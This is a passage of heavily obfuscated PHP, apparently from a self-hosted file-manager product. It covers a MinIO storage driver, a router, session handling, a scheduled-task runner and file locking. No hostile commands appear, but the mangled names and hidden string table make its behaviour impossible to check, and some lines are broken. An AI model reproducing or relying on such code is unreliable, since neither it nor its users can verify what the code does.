$this->isFolder($÷§†»€¦); } public function isFile($¨·‡‚”Õ) { return !$this->isFolder($¨·‡‚”Õ) && $this->objectMeta($¨·‡‚”Õ); } public function isFolder($ÍÎÙ—Œ·) { return $this->cacheMethod($_SERVER[‘ÆÜ‘œ][178], $ÍÎÙ—Œ·); } protected function objectMeta($Œ‰ƒŸâì) { return $this->cacheMethod($_SERVER[‘ÆÜ‘œ][180], $Œ‰ƒŸâì); } protected function _objectMeta($£ü´ç‚ô) { $„ì£¹’Ü =& $_SERVER[‘ÆÜ‘œ]; $£ü´ç‚ô = rtrim($£ü´ç‚ô, $„ì£¹’Ü[8]); try { $¤ûä¿ = $this->client->getObjectInfo($this->bucket, $£ü´ç‚ô); if (!isset($¤ûä¿[$„ì£¹’Ü[253]]) && isset($¤ûä¿[$„ì£¹’Ü[305]])) { $¤ûä¿[$„ì£¹’Ü[253]] = $¤ûä¿[$„ì£¹’Ü[305]]; } } catch (Exception $öüÛÑˆÂ) { $¤ûä¿ = !1; } if (!$¤ûä¿) { } return $¤ûä¿; } protected function _isFolder($Ì‚ØÔœ») { $°…İ¶ª¥ =& $_SERVER[‘ÆÜ‘œ]; $Ì‚ØÔœ» = rtrim($Ì‚ØÔœ», $°…İ¶ª¥[8]) . $°…İ¶ª¥[8]; if ($Ì‚ØÔœ» == $°…İ¶ª¥[12] || $Ì‚ØÔœ» == $°…İ¶ª¥[8]) { return !0; } $¾ÃüÆ°­ = $this->client->getBucket($this->bucket, $Ì‚ØÔœ», null, 1); if (empty($¾ÃüÆ°­[$°…İ¶ª¥[237]])) { return !1; } $“Š™””µ = $¾ÃüÆ°­[$°…İ¶ª¥[237]][0][$°…İ¶ª¥[32]]; return stripos($“Š™””µ, $Ì‚ØÔœ») === 0 ? !0 : !1; if (substr($“Š™””µ, -1) == $°…İ¶ª¥[8]) { return !0; } if (get_path_this($“Š™””µ) == get_path_this($Ì‚ØÔœ»)) { return !1; } return !0; } public function listObject($¯Ä¦ü§) { return $this->fileList($¯Ä¦ü§, $_SERVER[‘ÆÜ‘œ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ú÷şŠÄğ) { $ŸËÚÒ— =& $_SERVER[‘ÆÜ‘œ]; parent::__construct($ú÷şŠÄğ); $this->setSignVersion($ŸËÚÒ—[248]); if (!$this->region) { $this->region = $ŸËÚÒ—[306]; $this->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($Ş’¼­‡ü, $Ä–°éòô = 3600) { $àÇ°¨ =& $_SERVER[‘ÆÜ‘œ]; $îä¾’Æô = $àÇ°¨[230]; $ìÉò÷Îı = $àÇ°¨[258]; $Áª µçà = $àÇ°¨[62]; $£†‘¼§ù = gmdate($àÇ°¨[259]); $¯£õĞ…· = gmdate($àÇ°¨[260]); $ÊâØÆÀ = $àÇ°¨[261]; $¨±È–­¦ = $Ä–°éòô . $àÇ°¨[12]; $ë¥ş  = $àÇ°¨[262]; $¬Ù¦Õƒ = array($this->accessKey, $¯£õĞ…·, $this->region, $Áª µçà, $ÊâØÆÀ); $–¼“˜Ù = implode($àÇ°¨[8], $¬Ù¦Õƒ); $âÌ×áïí = array($àÇ°¨[263] => gmdate($àÇ°¨[264], strtotime($àÇ°¨[265])), $àÇ°¨[266] => array(array($àÇ°¨[267] => $this->bucket), array($àÇ°¨[307] => $îä¾’Æô), array($àÇ°¨[268], $àÇ°¨[269], $àÇ°¨[12]), array($àÇ°¨[268], $àÇ°¨[270], $àÇ°¨[12]), array($àÇ°¨[268], $àÇ°¨[308], $àÇ°¨[12]), array($àÇ°¨[271] => $ë¥ş ), array($àÇ°¨[272] => $–¼“˜Ù), array($àÇ°¨[273] => $ìÉò÷Îı), array($àÇ°¨[274] => $£†‘¼§ù), array($àÇ°¨[275] => $¨±È–­¦))); $ğÚöûø = base64_encode(json_encode($âÌ×áïí)); $†Ÿåúê = hash_hmac($àÇ°¨[276], $¯£õĞ…·, $àÇ°¨[277] . $this->secret, !0); $Î©é±é  = hash_hmac($àÇ°¨[276], $this->region, $†Ÿåúê, !0); $ñ´ÃıÛÇ = hash_hmac($àÇ°¨[276], $Áª µçà, $Î©é±é , !0); $¡À©²â = hash_hmac($àÇ°¨[276], $ÊâØÆÀ, $ñ´ÃıÛÇ, !0); $—…ãè¦£ = hash_hmac($àÇ°¨[276], $ğÚöûø, $¡À©²â); $Éƒ»âş = array($àÇ°¨[247] => $àÇ°¨[12], $àÇ°¨[295] => $àÇ°¨[12], $àÇ°¨[307] => $îä¾’Æô, $àÇ°¨[271] => $ë¥ş , $àÇ°¨[278] => $ğÚöûø, $àÇ°¨[309] => $–¼“˜Ù, $àÇ°¨[310] => $ìÉò÷Îı, $àÇ°¨[311] => $£†‘¼§ù, $àÇ°¨[312] => $¨±È–­¦, $àÇ°¨[313] => $—…ãè¦£, $àÇ°¨[207] => $this->getHost()); return $Éƒ»âş; } } goto E¶É…êŒÜò; c©˜³ô°‘™: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\x79" => "\133\x5e\x2f\135\53", "\x3a\x6e\x75\x6d" => "\x5b\60\55\x39\x5d\53", "\x3a\141\154\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($¾¹øÌó², $¬Ãæ‚–Ø) { $öÉÈõø¯ =& $_SERVER[‘ÆÜ‘œ]; if ($¾¹øÌó² == $öÉÈõø¯[1866]) { $Ñ—Œã› = array_map($öÉÈõø¯[1867], $¬Ãæ‚–Ø[0]); $èÅŠ±¥ = strpos($¬Ãæ‚–Ø[1], $öÉÈõø¯[8]) === 0 ? $¬Ãæ‚–Ø[1] : $öÉÈõø¯[8] . $¬Ãæ‚–Ø[1]; $Üã¦çª† = $¬Ãæ‚–Ø[2]; } else { $Ñ—Œã› = null; $èÅŠ±¥ = strpos($¬Ãæ‚–Ø[0], $öÉÈõø¯[8]) === 0 ? $¬Ãæ‚–Ø[0] : $öÉÈõø¯[8] . $¬Ãæ‚–Ø[0]; $Üã¦çª† = $¬Ãæ‚–Ø[1]; } array_push(self::$maps, $Ñ—Œã›); array_push(self::$routes, $èÅŠ±¥); array_push(self::$methods, strtoupper($¾¹øÌó²)); array_push(self::$callbacks, $Üã¦çª†); } public static function error($›‚ªÑä•) { self::$errorCallback = $›‚ªÑä•; } public static function haltOnMatch($·şæÂ‹ı = true) { self::$halts = $·şæÂ‹ı; } public static function dispatch() { $²ØííšÂ =& $_SERVER[‘ÆÜ‘œ]; $Ö´—Ú© = parse_url($_SERVER[$²ØííšÂ[1868]], PHP_URL_PATH); $—‚ÇçÎ = $_SERVER[$²ØííšÂ[162]]; $ä™ÊÒûŒ = array_keys(static::$patterns); $×Ç–„© = array_values(static::$patterns); $İ÷ÔÔğ¨ = !1; self::$routes = preg_replace($²ØííšÂ[1417], $²ØííšÂ[8], self::$routes); if (in_array($Ö´—Ú©, self::$routes)) { $›ğéä±Ê = array_keys(self::$routes, $Ö´—Ú©); foreach ($›ğéä±Ê as $¿¾Ë¶Ø) { if (self::$methods[$¿¾Ë¶Ø] == $—‚ÇçÎ || self::$methods[$¿¾Ë¶Ø] == $²ØííšÂ[1869] || in_array($—‚ÇçÎ, self::$maps[$¿¾Ë¶Ø])) { $İ÷ÔÔğ¨ = !0; if (!is_object(self::$callbacks[$¿¾Ë¶Ø])) { $‰¨çÜÁ’ = explode($²ØííšÂ[8], self::$callbacks[$¿¾Ë¶Ø]); $é‘»¢ĞĞ = end($‰¨çÜÁ’); $¡¥­¹å‰ = explode($²ØííšÂ[1347], $é‘»¢ĞĞ); $ĞˆÓ‰ÁÃ = new $¡¥­¹å‰[0](); $ĞˆÓ‰ÁÃ->{$¡¥­¹å‰[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$¿¾Ë¶Ø]); if (self::$halts) { return; } } } } } else { $Î®˜½§ = 0; foreach (self::$routes as $¿¾Ë¶Ø) { if (strpos($¿¾Ë¶Ø, $²ØííšÂ[4]) !== !1) { $¿¾Ë¶Ø = str_replace($ä™ÊÒûŒ, $×Ç–„©, $¿¾Ë¶Ø); } if (preg_match($²ØííšÂ[1870] . $¿¾Ë¶Ø . $²ØííšÂ[1871], $Ö´—Ú©, $Äê·ë¸)) { if (self::$methods[$Î®˜½§] == $—‚ÇçÎ || self::$methods[$Î®˜½§] == $²ØííšÂ[1869] || !empty(self::$maps[$Î®˜½§]) && in_array($—‚ÇçÎ, self::$maps[$Î®˜½§])) { $İ÷ÔÔğ¨ = !0; array_shift($Äê·ë¸); if (!is_object(self::$callbacks[$Î®˜½§])) { $‰¨çÜÁ’ = explode($²ØííšÂ[8], self::$callbacks[$Î®˜½§]); $é‘»¢ĞĞ = end($‰¨çÜÁ’); $¡¥­¹å‰ = explode($²ØííšÂ[1347], $é‘»¢ĞĞ); $ĞˆÓ‰ÁÃ = new $¡¥­¹å‰[0](); if (!method_exists($ĞˆÓ‰ÁÃ, $¡¥­¹å‰[1])) { echo $²ØííšÂ[1872]; } else { call_user_func_array(array($ĞˆÓ‰ÁÃ, $¡¥­¹å‰[1]), $Äê·ë¸); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Î®˜½§], $Äê·ë¸); if (self::$halts) { return; } } } } $Î®˜½§++; } } if ($İ÷ÔÔğ¨ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $„œç–Æ© =& $_SERVER[‘ÆÜ‘œ]; header($_SERVER[$„œç–Æ©[1873]] . $„œç–Æ©[1874]); echo $„œç–Æ©[1875]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$²ØííšÂ[1868]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $œìğüÇî =& $_SERVER[‘ÆÜ‘œ]; static $´ÙÃóü¨ = false; if ($´ÙÃóü¨) { return $´ÙÃóü¨; } $Ûè»ÊÈ± = $GLOBALS[$œìğüÇî[6]][$œìğüÇî[434]]; self::$sessionTime = $Ûè»ÊÈ±[$œìğüÇî[1876]]; $£Ä¿ÑŞÓ = isset($GLOBALS[$œìğüÇî[1877]]) ? $GLOBALS[$œìğüÇî[1877]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($£Ä¿ÑŞÓ)) { self::$sessionSign = Cookie::get($£Ä¿ÑŞÓ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($£Ä¿ÑŞÓ, self::$sessionSign, self::$sessionTime); $ÆçşÈ³² = $Ûè»ÊÈ±[$œìğüÇî[1878]]; $¦¹ŒÍ¥µ = $Ûè»ÊÈ±[$ÆçşÈ³²]; $Ğê®¹œ = $Ûè»ÊÈ±[$œìğüÇî[942]]; switch ($ÆçşÈ³²) { case $œìğüÇî[21]: self::$handle = Model($œìğüÇî[943]); break; case $œìğüÇî[944]: self::$handle = new CacheRedis($¦¹ŒÍ¥µ, $Ğê®¹œ); break; case $œìğüÇî[945]: self::$handle = new CacheMemcached($¦¹ŒÍ¥µ, $Ğê®¹œ); break; case $œìğüÇî[231]: $¦¹ŒÍ¥µ[$œìğüÇî[87]] = $¦¹ŒÍ¥µ[$œìğüÇî[87]] . $œìğüÇî[1879]; self::$handle = new CacheFile($¦¹ŒÍ¥µ, $Ğê®¹œ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); if (!self::$data || !isset(self::$data[$œìğüÇî[1613]]) || time() - self::$data[$œìğüÇî[1613]] >= 5) { self::dataSave(); } } $´ÙÃóü¨ = new self(); return $´ÙÃóü¨; } public static function getBySign($µÎæ€Ú) { $¾İ¤ú¨µ = self::$handle->get($µÎæ€Ú); $¾İ¤ú¨µ = unserialize($¾İ¤ú¨µ); return is_array($¾İ¤ú¨µ) ? $¾İ¤ú¨µ : array(); } public static function setBySign($¹ó—½À³, $€‚ªÖº™) { self::$sessionSign = $¹ó—½À³; self::$data = $€‚ªÖº™; self::dataSave(); } private static function dataSave() { CacheLock::lock(self::$sessionSign); if (!self::$data || !is_array(self::$data)) { self::$data = array(); } self::$data[$_SERVER[‘ÆÜ‘œ][1613]] = time(); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function sign($ß†å‡ã² = false) { if ($ß†å‡ã²) { self::$sessionSign = $ß†å‡ã²; } self::init(); return self::$sessionSign; } public static function set($±Îšşì™, $Æ´ĞõÓï = false) { self::init(); if (is_array($±Îšşì™)) { foreach ($±Îšşì™ as $ê¾»°ˆÔ => $ê¼¸½ü) { array_set_value(self::$data, $ê¾»°ˆÔ, $ê¼¸½ü); } } else { array_set_value(self::$data, $±Îšşì™, $Æ´ĞõÓï); } self::dataSave(); } public static function get($œªÃÔê‚ = false) { self::init(); if (!$œªÃÔê‚) { return self::$data; } return array_get_value(self::$data, $œªÃÔê‚); } public static function remove($ÈŞ§×ˆ) { self::init(); unset(self::$data[$ÈŞ§×ˆ]); self::dataSave(); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[‘ÆÜ‘œ][951])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $¶ÇÌõ§ =& $_SERVER[‘ÆÜ‘œ]; if (self::valueGet($¶ÇÌõ§[857]) != $¶ÇÌõ§[91]) { return; } if (self::valueGet($¶ÇÌõ§[1880]) == $¶ÇÌõ§[91]) { $¬ªÍ«Ÿ = self::valueGet($¶ÇÌõ§[1881]); if (time() - $¬ªÍ«Ÿ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($¶ÇÌõ§[1880], $¶ÇÌõ§[91]); self::log($¶ÇÌõ§[1882] . ACTION . $¶ÇÌõ§[1883]); Hook::bind($¶ÇÌõ§[1884], $¶ÇÌõ§[1885]); $ä‘è³ŠÎ = 0; while (!0) { self::cacheClear(); if (self::valueGet($¶ÇÌõ§[857]) != $¶ÇÌõ§[91]) { self::valueSet($¶ÇÌõ§[1880], $¶ÇÌõ§[229]); self::log($¶ÇÌõ§[1886]); die; } $é–—ß°¾ = time(); if ($é–—ß°¾ - $ä‘è³ŠÎ >= 60) { self::valueSet(array($¶ÇÌõ§[1880] => $¶ÇÌõ§[91], $¶ÇÌõ§[1881] => $é–—ß°¾)); $ä‘è³ŠÎ = $é–—ß°¾; } if (!file_exists(USER_SYSTEM . $¶ÇÌõ§[1887])) { self::valueSet(array($¶ÇÌõ§[1880] => $¶ÇÌõ§[229], $¶ÇÌõ§[857] => $¶ÇÌõ§[229])); self::log($¶ÇÌõ§[1888]); die; } $Ñí‹‹§ = file_get_contents(BASIC_PATH . $¶ÇÌõ§[1889]); $ì‚Ğ®àş = KOD_VERSION . $¶ÇÌõ§[10] . KOD_VERSION_BUILD; $¿§„²ï = match_text($Ñí‹‹§, $¶ÇÌõ§[1890]) . $¶ÇÌõ§[10] . match_text($Ñí‹‹§, $¶ÇÌõ§[1891]); if ($¿§„²ï != $ì‚Ğ®àş) { self::restart(); self::log("\163\x74\157\x70\145\144\56\x5b\166\x65\162\163\x69\157\156\40\x75\x70\144\141\164\145\73{$versionNow}\40\x3d\x3e\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $çŒ¸Ó„ =& $_SERVER[‘ÆÜ‘œ]; http_close(); $GLOBALS[$çŒ¸Ó„[1892]] = 1; $_SERVER[$çŒ¸Ó„[1893]] = $çŒ¸Ó„[1894]; $_COOKIE = array(); $GLOBALS[$çŒ¸Ó„[1895]] = 1; $GLOBALS[$çŒ¸Ó„[1896]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $åÈ«Ûı˜ =& $_SERVER[‘ÆÜ‘œ]; http_close(); self::valueSet($åÈ«Ûı˜[857], $åÈ«Ûı˜[229]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($åÈ«Ûı˜[1880] => $åÈ«Ûı˜[229], $åÈ«Ûı˜[857] => $åÈ«Ûı˜[91])); self::log($åÈ«Ûı˜[1897]); } public static function taskSwitch() { $öã›ê…ƒ =& $_SERVER[‘ÆÜ‘œ]; $Øğ£ğøÑ = self::valueGet($öã›ê…ƒ[857]) == $öã›ê…ƒ[91] ? $öã›ê…ƒ[229] : $öã›ê…ƒ[91]; self::valueSet($öã›ê…ƒ[857], $Øğ£ğøÑ); } public static function shutdownEvent() { $¨şŸ›‹ô =& $_SERVER[‘ÆÜ‘œ]; self::valueSet($¨şŸ›‹ô[1880], $¨şŸ›‹ô[229]); self::log($¨şŸ›‹ô[1898]); } public static function config($ÎÀÍ¤Ûè, $¶•ŞèÓ’) { self::valueSet($_SERVER[‘ÆÜ‘œ][857], $ÎÀÍ¤Ûè); } private static function taskRunAll() { $æ“ôÁ÷ó =& $_SERVER[‘ÆÜ‘œ]; $¢ˆ§øŠ = timeFloat(); $îİ­Ààƒ = Model($æ“ôÁ÷ó[1899])->listData(); $²Ë”®ş• = count($îİ­Ààƒ); for ($„ŸŸÈ‡ä = 0; $„ŸŸÈ‡ä < $²Ë”®ş•; $„ŸŸÈ‡ä++) { $ª†ÏŠâ = $îİ­Ààƒ[$„ŸŸÈ‡ä]; if (!$ª†ÏŠâ[$æ“ôÁ÷ó[495]] || $ª†ÏŠâ[$æ“ôÁ÷ó[1900]] != $æ“ôÁ÷ó[91]) { continue; } if (!self::taskTimeCheck($ª†ÏŠâ)) { continue; } self::taskRun($ª†ÏŠâ); } Hook::trigger($æ“ôÁ÷ó[1901]); self::taskQueueRun($¢ˆ§øŠ); } private static function taskQueueRun($²ìú÷ Š) { $Ş”ô–³¿ = 10; while (!0) { $ÇäğÊäØ = TaskQueue::run(); if ($ÇäğÊäØ === !1) { break; } if (timeFloat() - $²ìú÷ Š >= $Ş”ô–³¿) { break; } } } private static function taskTimeCheck($ŸÅ‹¢÷™) { $Ú…ê”†ç =& $_SERVER[‘ÆÜ‘œ]; $ƒ¼œĞøï = json_decode($ŸÅ‹¢÷™[$Ú…ê”†ç[205]], !0); $àı¶€Ô‚ = intval($ŸÅ‹¢÷™[$Ú…ê”†ç[1881]]); $»‹´üÙğ = strtotime($Ú…ê”†ç[1902] . $ƒ¼œĞøï[$Ú…ê”†ç[1903]] . $Ú…ê”†ç[1904]) - strtotime($Ú…ê”†ç[1905]); $ÜÑĞÆì = time() - strtotime(date($Ú…ê”†ç[1906]) . $Ú…ê”†ç[1907]); $µ»õßä› = $ÜÑĞÆì >= $»‹´üÙğ && $ÜÑĞÆì <= $»‹´üÙğ + 3600; switch ($ƒ¼œĞøï[$Ú…ê”†ç[33]]) { case $Ú…ê”†ç[1908]: if (time() - $àı¶€Ô‚ < 3600 * 24 * 30) { return !1; } if ($ƒ¼œĞøï[$Ú…ê”†ç[1908]] == date($Ú…ê”†ç[1909]) && $µ»õßä›) { return !0; } break; case $Ú…ê”†ç[1910]: if (time() - $àı¶€Ô‚ < 3600 * 24 * 7) { return !1; } $ÙÛõªİ = date($Ú…ê”†ç[1911]) == 0 ? 7 : date($Ú…ê”†ç[1911]); if ($ƒ¼œĞøï[$Ú…ê”†ç[1910]] == $ÙÛõªİ && $µ»õßä›) { return !0; } break; case $Ú…ê”†ç[1903]: if (time() - $àı¶€Ô‚ < 3600 * 24) { return !1; } if ($µ»õßä›) { return !0; } break; case $Ú…ê”†ç[1912]: if (time() - $àı¶€Ô‚ >= floatval($ƒ¼œĞøï[$Ú…ê”†ç[1912]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $†Ö“òö½ =& $_SERVER[‘ÆÜ‘œ]; static $Ş¯ù«»– = 0; $ØË¿òƒÂ = 300; if (!$Ş¯ù«»–) { $Ş¯ù«»– = time(); } if (time() - $Ş¯ù«»– < $ØË¿òƒÂ) { return; } $Ş¯ù«»– = time(); $ï¯œ†…¾ = Model($†Ö“òö½[605])->db($†Ö“òö½[12]); if ($ï¯œ†…¾) { $ï¯œ†…¾->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($†Ö“òö½[1913], $†Ö“òö½[1914]); die; } } public static function taskRun($ƒ“·¡üë) { $§š»ì¢› =& $_SERVER[‘ÆÜ‘œ]; self::log($§š»ì¢›[1915] . $ƒ“·¡üë[$§š»ì¢›[495]] . $§š»ì¢›[1916] . $ƒ“·¡üë[$§š»ì¢›[32]] . $§š»ì¢›[1917] . $ƒ“·¡üë[$§š»ì¢›[1515]]); Model($§š»ì¢›[1899])->run($ƒ“·¡üë[$§š»ì¢›[495]]); $çÂßæ¸Û = timeFloat(); $ƒ’“£«± = $§š»ì¢›[12]; switch ($ƒ“·¡üë[$§š»ì¢›[33]]) { case $§š»ì¢›[392]: $ğ¯İãó¶ = url_request($ƒ“·¡üë[$§š»ì¢›[1515]], $§š»ì¢›[1557], !1, !1, !1, !1, 10); if ($ğ¯İãó¶[$§š»ì¢›[857]]) { $ƒ’“£«± = strlen($ğ¯İãó¶[$§š»ì¢›[1341]]); } break; case $§š»ì¢›[1918]: $ƒ’“£«± = Hook::apply($ƒ“·¡üë[$§š»ì¢›[1515]]); default: break; } Model($§š»ì¢›[1919])->add(array($§š»ì¢›[1920] => $§š»ì¢›[12], $§š»ì¢›[1921] => $§š»ì¢›[229], $§š»ì¢›[33] => $§š»ì¢›[1922] . $ƒ“·¡üë[$§š»ì¢›[495]], $§š»ì¢›[1923] => json_encode(array($§š»ì¢›[32] => $ƒ“·¡üë[$§š»ì¢›[32]], $§š»ì¢›[1924] => timeFloat() - $çÂßæ¸Û, $§š»ì¢›[863] => $ƒ’“£«±)))); $ŠÔÛô“½ = $ƒ’“£«± ? $§š»ì¢›[1925] . $ƒ’“£«± : $§š»ì¢›[12]; self::log($§š»ì¢›[1926] . $ƒ“·¡üë[$§š»ì¢›[495]] . $§š»ì¢›[176] . $ŠÔÛô“½); return !0; } public static function valueGet($ŠÖ„†²Í) { $áÓŞäüŞ =& $_SERVER[‘ÆÜ‘œ]; $„Ğ’ÍŒ = $áÓŞäüŞ[1927]; $ğı®Şù¹ = Model($áÓŞäüŞ[530])->get($ŠÖ„†²Í, $„Ğ’ÍŒ); if (is_null($ğı®Şù¹)) { Model($áÓŞäüŞ[530])->set($áÓŞäüŞ[857], $áÓŞäüŞ[91], $„Ğ’ÍŒ); Model($áÓŞäüŞ[530])->set($áÓŞäüŞ[1880], $áÓŞäüŞ[229], $„Ğ’ÍŒ); $ğı®Şù¹ = Model($áÓŞäüŞ[530])->get($ŠÖ„†²Í, $„Ğ’ÍŒ); } return $ğı®Şù¹; } private static function valueSet($ä¥µÅØË, $ùŸ¯ùÊı = false) { $›³Öáï =& $_SERVER[‘ÆÜ‘œ]; $…‚ØëÃÙ = $›³Öáï[1928]; CacheLock::lock($…‚ØëÃÙ); $øÀãÁñ = Model($›³Öáï[530])->set($ä¥µÅØË, $ùŸ¯ùÊı, $›³Öáï[1927]); CacheLock::unlock($…‚ØëÃÙ); return $øÀãÁñ; } protected static function log($¾ä«ø¯‘) { write_log($¾ä«ø¯‘, $_SERVER[‘ÆÜ‘œ][1914]); } private static function cacheClear() { $ÀŠ–ó =& $_SERVER[‘ÆÜ‘œ]; Cache::clearMemory(Model($ÀŠ–ó[530])->cacheKey($ÀŠ–ó[1927])); Cache::clearMemory(Model($ÀŠ–ó[530])->cacheKey($ÀŠ–ó[1929])); Model($ÀŠ–ó[1899])->cacheClear(); self::closeDatabase(); } } goto E‘‘×ëòÎÄ; Cä±ÕË‰à†: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($øÇè¿â) { $İ¥¦ëŒß =& $_SERVER[‘ÆÜ‘œ]; if (!$this->allowLock()) { return; } $this->_lockCheck($İ¥¦ëŒß[649], $øÇè¿â); $›Ïª¡´• = 1; $this->_lockEvent($øÇè¿â, array($İ¥¦ëŒß[650], $İ¥¦ëŒß[651]), $›Ïª¡´•); $this->_lockParent($øÇè¿â, array($İ¥¦ëŒß[651]), $›Ïª¡´•); $this->_lockEvent($øÇè¿â, array($İ¥¦ëŒß[652], $İ¥¦ëŒß[653]), $›Ïª¡´•); $this->_lockCheckEnd($İ¥¦ëŒß[649], $øÇè¿â); } public function lockCopyEnd($ôı—¼œø) { $³èÒç¢å =& $_SERVER[‘ÆÜ‘œ]; if (!$this->allowLock()) { return; } $ò„¼‡Ò› = 0; $this->_lockEvent($ôı—¼œø, array($³èÒç¢å[650], $³èÒç¢å[651]), $ò„¼‡Ò›); $this->_lockParent($ôı—¼œø, array($³èÒç¢å[651]), $ò„¼‡Ò›); $this->_lockEvent($ôı—¼œø, array($³èÒç¢å[652], $³èÒç¢å[653]), $ò„¼‡Ò›); } public function lockWriteStart($ô»à¯Ô¦, $¢şŠñì» = '') { $õëñ»ã =& $_SERVER[‘ÆÜ‘œ]; if (!$this->allowLock()) { return; } $this->_lockCheck($õëñ»ã[650], $ô»à¯Ô¦); $˜×§ææÈ = 1; $this->_lockKey($õëñ»ã[654] . $ô»à¯Ô¦ . $õëñ»ã[10] . $¢şŠñì», $˜×§ææÈ); $this->_lockEvent($ô»à¯Ô¦, array($õëñ»ã[649], $õëñ»ã[651]), $˜×§ææÈ); $this->_lockParent($ô»à¯Ô¦, array($õëñ»ã[649], $õëñ»ã[651]), $˜×§ææÈ); $this->_lockCheckEnd($õëñ»ã[650], $ô»à¯Ô¦); } public function lockWriteEnd($ä’·˜§×, $‰±êâ£” = '') { $°†½¦íÆ =& $_SERVER[‘ÆÜ‘œ]; if (!$this->allowLock()) { return; } $ƒ€¤½“î = 0; $this->_lockKey($°†½¦íÆ[654] . $ä’·˜§× . $°†½¦íÆ[10] . $‰±êâ£”, $ƒ€¤½“î); $this->_lockEvent($ä’·˜§×, array($°†½¦íÆ[649], $°†½¦íÆ[651]), $ƒ€¤½“î); $this->_lockParent($ä’·˜§×, array($°†½¦íÆ[649], $°†½¦íÆ[651]), $ƒ€¤½“î); } public function lockMoveStart($À²¬Ÿ›) { $ùêöò×Ç =& $_SERVER[‘ÆÜ‘œ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ùêöò×Ç[651], $À²¬Ÿ›); $èŞÈÂìÅ = 1; $this->_lockKey($ùêöò×Ç[655] . $À²¬Ÿ›, $èŞÈÂìÅ); $this->_lockEvent($À²¬Ÿ›, array($ùêöò×Ç[649], $ùêöò×Ç[650]), $èŞÈÂìÅ); $this->_lockParent($À²¬Ÿ›, array($ùêöò×Ç[649], $ùêöò×Ç[651]), $èŞÈÂìÅ); $this->_lockEvent($À²¬Ÿ›, array($ùêöò×Ç[656], $ùêöò×Ç[652], $ùêöò×Ç[653]), $èŞÈÂìÅ); $this->_lockCheckEnd($ùêöò×Ç[651], $À²¬Ÿ›); } public function lockMoveEnd($“ò¢à­) { $Èï—•‡Ë =& $_SERVER[‘ÆÜ‘œ]; if (!$this->allowLock()) { return; } $ÍèäŠŸ = 0; $this->_lockKey($Èï—•‡Ë[655] . $“ò¢à­, $ÍèäŠŸ); $this->_lockEvent($“ò¢à­, array($Èï—•‡Ë[649], $Èï—•‡Ë[650]), $ÍèäŠŸ); $this->_lockParent($“ò¢à­, array($Èï—•‡Ë[649], $Èï—•‡Ë[651]), $ÍèäŠŸ); $this->_lockEvent($“ò¢à­, array($Èï—•‡Ë[656], $Èï—•‡Ë[652], $Èï—•‡Ë[653]), $ÍèäŠŸ); } private function _lockCheck($¬™°«, $êø»ä) { $¢‘ÔüøÊ =& $_SERVER[‘ÆÜ‘œ]; $ÀÔÀµ…Ï = $this->sourceInfo($êø»ä); $êÑµÈ÷ = $¬™°« . $¢‘ÔüøÊ[10] . $êø»ä; $this->_lockTimeStart[$êÑµÈ÷] = timeFloat(); if (!is_array($ÀÔÀµ…Ï)) { return; } $€ˆŠÚ¤œ = LNG($¢‘ÔüøÊ[657]); CacheLock::setErrorMsg($¢‘ÔüøÊ[174] . htmlspecialchars($ÀÔÀµ…Ï[$¢‘ÔüøÊ[32]]) . $¢‘ÔüøÊ[176] . $€ˆŠÚ¤œ); $this->_lockKey($êÑµÈ÷, 1); $this->_lockKey($êÑµÈ÷, 0); $›”˜ª’Æ = array_reverse($this->parentLevelArray($ÀÔÀµ…Ï[$¢‘ÔüøÊ[612]])); foreach ($›”˜ª’Æ as $±Öğ›‚İ) { $êÑµÈ÷ = $¬™°« . $¢‘ÔüøÊ[658] . $±Öğ›‚İ; if (CacheLock::lockGet($¢‘ÔüøÊ[659] . $êÑµÈ÷)) { $ÀÔÀµ…Ï = $this->sourceInfo($±Öğ›‚İ); CacheLock::setErrorMsg($¢‘ÔüøÊ[174] . htmlspecialchars($ÀÔÀµ…Ï[$¢‘ÔüøÊ[32]]) . $¢‘ÔüøÊ[176] . $€ˆŠÚ¤œ); $this->_lockKey($êÑµÈ÷, 1); $this->_lockKey($êÑµÈ÷, 0); } } } private function _lockCheckEnd($ãÎªğ‘Ú, $©Êû‡ÑÉ) { $¶Û»Šáæ =& $_SERVER[‘ÆÜ‘œ]; $“­õ™¸Æ = $ãÎªğ‘Ú . $¶Û»Šáæ[10] . $©Êû‡ÑÉ; CacheLock::setErrorMsg($¶Û»Šáæ[472]); if (!isset($this->_lockTimeStart[$“­õ™¸Æ])) { return; } $Ä¦‹˜çâ = timeFloat() - $this->_lockTimeStart[$“­õ™¸Æ]; 